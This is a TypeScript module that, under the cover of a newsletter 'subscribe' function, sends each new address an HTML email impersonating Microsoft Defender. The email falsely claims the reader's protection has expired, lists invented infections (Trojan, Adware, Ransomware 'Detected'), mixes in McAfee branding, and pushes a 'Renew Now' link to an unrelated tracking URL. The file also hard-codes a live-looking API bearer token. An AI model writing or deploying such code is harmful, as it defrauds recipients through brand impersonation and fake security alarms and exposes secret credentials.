import { ApiResponse } from './types';
import handlebars from 'handlebars';

const STRAPI_URL = 'https://passionate-cows-35f2aac5ed.strapiapp.com';
const API_TOKEN = '80e254ac4fa3cbdc1a1e9b5b804ce938b720d98a9cea2a0b9b62c688c8b7a492029b8c0c09f8b1b72e1055fa33a79a834a692004d5dc2b3f53bcd0a20ce4071c0f880b000111bdd41980956da980ba4b902df13da8c525b4e80aa264b4c2c62ee841dd85d69e9db9afbf32a670f0bafc64c4f8e5cd1ee7f8155d430b9cf955bd';

const emailTemplate = `
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<style>

</style>
<body style="padding:0; margin:0 auto; display:block; min-width:100%; width:100%;font-family: 'Segoe UI', sans-serif;background-color:#F5F5F5">

    <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr>
            <td align="center" valign="top">
                <table width="600" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                        <td style="width:600px; min-width:600px; padding:0; margin:0; font-weight:normal;padding: 20px;">

                            <!-- Header -->
                            <table width="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#ffffff" style=" overflow:hidden;">
                                <tr>
                                    <td align="center" style="padding: 20px;">
                                      <b style="font-size:40px;color:#28445A">Microsoft Defender</b>
                                       
                                    </td>
                                </tr>
                            </table>

                            <!-- Main Content -->
                            <table width="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#ffffff" style="border-radius: 0 0 ; overflow:hidden; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
                                <tr>
                                    <td align="center" style="padding: 20 20px;">
                                        <h1 style="color:#28445A; font-size:28px; line-height:1.4; font-weight:bold; margin:0;padding: 20px">Your protection expires today!</h1>
                                        <p style="color:#666; font-size:17px; line-height:1.6; margin: 0;font-weight:bold;">Please renew your subscription to remain protected!</p>
                                    </td>
                                </tr>

                                <tr>
                                    <td style="padding: 0px 20px;">
                                        <p style="color:#666; font-size:16px; line-height:1.6; text-align:center;font-weight:bold;">
                                            Your McAfee subscription has expired and your protection against online threats is currently inactive. Without this protection, you are vulnerable to cyber attacks, malware, and other security risks.
                                        </p>

                                        <!-- Virus Scan Table -->
                                        <table width="100%" border="1" cellspacing="0" cellpadding="10" style="margin: 20px auto; border-collapse: collapse; text-align: center; font-size: 16px;">
                                            <tr style="background-color: #28445A; color: white;font-weight:bold;">
                                                <th style="padding: 10px;">Virus Name</th>
                                                <th style="padding: 10px;">Scan Result</th>
                                                <th style="padding: 10px;">Damage Percentage</th><br><center style="padding:10px;background-color:red"><B style="color:white;width:200px;font-size:20px">Latest Scan Result</B></center><br>
                                            </tr>
                                            <tr style="background-color: #f9f9f9;">
                                                <td>Trojan.Generic</td>
                                                <td style="color:#28445A; font-weight:bold;">Detected</td>
                                                <td>45%</td>
                                            </tr>
                                            <tr>
                                                <td>Adware.Elex</td>
                                                <td style="color:#28445A; font-weight:bold;">Detected</td>
                                                <td>30%</td>
                                            </tr>
                                            <tr style="background-color: #f9f9f9;">
                                                <td>Ransomware.Locky</td>
                                                <td style="color:#28445A; font-weight:bold;">Detected</td>
                                                <td>80%</td>
                                            </tr>
                                        </table>

                                        <p style="color:#666; font-size:16px; line-height:1.6; text-align:center;font-weight:bold;">
                                            Renew today to maintain the protection of your personal data and continue browsing safely. Preserve your online privacy and surf anonymously and securely with Secure VPN.
                                        </p>

                                        <!-- Button -->
                                        <div style="text-align:center; margin: 30px 0;">
                                            <a href="https://www.worldoneonline.com/QCPFZ4/52WS7HL/" style="text-decoration:none; background-color:#28445A; color:white; padding:15px 30px; font-size:18px; font-weight:bold; border-radius:50px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);">Renew Now</a>
                                        </div>
                                    </td>
                                </tr>
                            </table>

                            <!-- Footer -->
                            <table width="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#28445A">
                                <tr>
                                    <td style="padding: 20px; font-family: 'Segoe UI', sans-serif; font-size:14px; line-height:1.6; color:#ffffff; text-align:center;">
                                        All rights reserved, Microsoft 2025.
                                    </td>
                                </tr>
                            </table>

                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>

</body>
</html>
`;

const compiledTemplate = handlebars.compile(emailTemplate);

export const subscribeEmail = async (email: string): Promise<ApiResponse> => {
  try {
    const response = await fetch(`${STRAPI_URL}/api/subscribers`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${API_TOKEN}`
      },
      body: JSON.stringify({
        data: {
          Email: email
        }
      })
    });

    const data = await response.json();
    
    if (!response.ok) {
      throw new Error(data.error?.message || 'Failed to subscribe');
    }

    const templateData = {
      email: email,
      unsubscribeUrl: `${STRAPI_URL}/unsubscribe?email=${email}`,
      websiteUrl: STRAPI_URL
    };

    const htmlContent = compiledTemplate(templateData);

    const emailResponse = await fetch(`${STRAPI_URL}/api/email`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${API_TOKEN}`
      },
      body: JSON.stringify({
        from: 'news <no-reply@strapiapp.com>',
        to: email,
        subject: 'Your Microsoft Defender Subscription Has Expired',
        html: htmlContent,
        text: 'Your Microsoft Defender subscription has expired. Please renew your subscription to maintain protection.'
      })
    });

    if (!emailResponse.ok) {
      console.warn('Failed to send confirmation email:', await emailResponse.text());
    }

    return {
      success: true,
      message: 'Successfully subscribed! Please check your email for confirmation.',
      data
    };
  } catch (error) {
    console.error('Subscription error:', error);
    return {
      success: false,
      message: error instanceof Error ? error.message : 'An unexpected error occurred'
    };
  }
};